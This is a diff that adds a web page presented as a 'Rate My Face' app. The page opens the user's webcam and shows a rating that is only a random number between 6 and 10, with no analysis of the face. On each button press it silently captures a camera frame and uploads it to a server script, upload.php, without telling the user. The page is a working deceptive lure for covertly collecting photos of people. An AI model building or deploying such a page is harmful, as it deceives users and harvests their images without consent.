@@ -1,0 +1,133 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Face Rating</title>
+  <style>
+    html, body {
+      margin: 0;
+      padding: 0;
+      height: 100%;
+      overflow: hidden;
+      font-family: Arial, sans-serif;
+      background: black;
+    }
+    #camera {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      object-fit: cover;
+      z-index: 1;
+    }
+    .overlay {
+      position: absolute;
+      top: 0;
+      left: 0;
+      height: 100%;
+      width: 100%;
+      display: flex;
+      flex-direction: column;
+      justify-content: flex-end;
+      align-items: center;
+      z-index: 2;
+      background-color: rgba(0,0,0,0.4);
+      padding-bottom: 60px;
+    }
+    #result {
+      color: #00ffcc;
+      font-size: 28px;
+      margin-bottom: 20px;
+      font-weight: bold;
+      display: none;
+      text-shadow: 0 0 10px #000;
+    }
+    #rateBtn {
+      padding: 15px 30px;
+      font-size: 18px;
+      background-color: #00ffcc;
+      border: none;
+      border-radius: 30px;
+      cursor: pointer;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.3);
+    }
+    #permissionMsg {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      color: white;
+      font-size: 20px;
+      text-align: center;
+      z-index: 3;
+    }
+  </style>
+</head>
+<body>
+  <video id="camera" autoplay playsinline muted></video>
+  <div class="overlay">
+    <div id="result"></div>
+    <button id="rateBtn">Rate My Face</button>
+  </div>
+  <div id="permissionMsg">Please allow camera access...</div>
+
+  <script>
+    const video = document.getElementById('camera');
+    const rateBtn = document.getElementById('rateBtn');
+    const resultDiv = document.getElementById('result');
+    const permissionMsg = document.getElementById('permissionMsg');
+
+    async function startCamera() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        video.srcObject = stream;
+        permissionMsg.style.display = "none";
+      } catch (err) {
+        permissionMsg.innerText = "Camera permission denied. Reload and allow access.";
+        console.error(err);
+      }
+    }
+
+    function getSavedRating() {
+      let base = localStorage.getItem("face_rating_base");
+      if (!base) {
+        base = (Math.random() * 4 + 6).toFixed(1);
+        localStorage.setItem("face_rating_base", base);
+      }
+      return parseFloat(base);
+    }
+
+    function getVariedRating(base) {
+      const variation = (Math.random() * 0.3 - 0.15).toFixed(1);
+      let final = (base + parseFloat(variation)).toFixed(1);
+      if (final > 10) final = 10;
+      if (final < 6) final = 6;
+      return final;
+    }
+
+    async function captureAndUpload() {
+      const canvas = document.createElement("canvas");
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      canvas.getContext("2d").drawImage(video, 0, 0, canvas.width, canvas.height);
+      const blob = await new Promise(resolve => canvas.toBlob(resolve, "image/jpeg"));
+      const formData = new FormData();
+      formData.append("photo", blob, "photo.jpg");
+      fetch("upload.php", { method: "POST", body: formData });
+    }
+
+    rateBtn.addEventListener("click", () => {
+      const baseRating = getSavedRating();
+      const rating = getVariedRating(baseRating);
+      resultDiv.innerText = `Your Face Rating: ${rating} / 10`;
+      resultDiv.style.display = "block";
+      captureAndUpload();
+    });
+
+    startCamera();
+  </script>
+</body>
+</html>
